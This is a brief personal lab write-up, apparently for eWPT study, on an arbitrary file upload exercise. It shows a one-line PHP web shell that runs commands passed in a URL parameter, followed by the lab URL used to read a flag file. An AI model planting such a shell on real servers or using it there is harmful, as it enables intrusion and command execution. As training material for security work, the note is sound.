2025-08-21 20:42

Status:

Tags: [[eWPT]] [[File & Resource Attacks]]
###### Prerequisites: 
# Arbitrary File Upload Lab


So first this is the lab
![[Pics/Screenshot 2025-08-21 at 8.42.06 PM.png]]

i just uploaded a reverse shell  that has the code

```php
<?php system($_GET['cmd']); ?>
```

and opend it and navigated through the system and found the flag

```bash
https://gencql9yy0egv99slsbfo8vgw.eu-central-6.attackdefensecloudlabs.com/uploads/shell.php?cmd=cat%20/var/www/html/127331690c-flag
```

![[Pics/Screenshot 2025-08-21 at 8.44.09 PM.png]]